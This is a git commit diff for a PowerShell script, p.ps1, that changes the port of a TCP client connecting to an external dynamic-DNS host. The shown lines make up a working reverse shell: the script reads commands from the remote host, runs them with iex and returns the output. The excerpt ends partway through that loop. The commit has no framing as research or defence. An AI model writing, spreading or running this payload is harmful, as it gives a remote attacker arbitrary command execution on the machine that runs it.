24f3a28b7c730861238a69c064c0ba4b1a75bef3
Parrot-cyber <77232937+Parrot-cyber@users.noreply.github.com>
2021-01-10 13:05:51 +0000

    Update p.ps1

--- p.ps1
+++ p.ps1
@@ -1,4 +1,4 @@
-$client = New-Object System.Net.Sockets.TCPClient("66160790df94.sn.mynetname.net",4444);
+$client = New-Object System.Net.Sockets.TCPClient("66160790df94.sn.mynetname.net",58801);
 $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
 $sendback = (iex $data 2>&1 | Out-String );
